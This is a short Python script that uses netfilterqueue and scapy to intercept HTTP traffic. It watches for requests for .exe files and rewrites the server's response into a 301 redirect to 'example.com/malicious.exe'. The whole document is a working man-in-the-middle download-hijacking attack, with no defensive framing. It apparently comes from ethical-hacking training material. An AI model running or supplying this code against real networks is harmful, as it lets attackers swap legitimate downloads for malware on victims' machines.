#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load.encode()  # Convert string to bytes for Python 3
    # Remove fields so Scapy recalculates them
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        # HTTP Request
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:  # Check bytes in Python 3
                print("[+] exe Request detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        # HTTP Response
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file with redirect...")
                modified_packet = set_load(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nLocation: http://example.com/malicious.exe\n\n"
                )
                packet.set_payload(bytes(modified_packet))  # bytes, not str

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
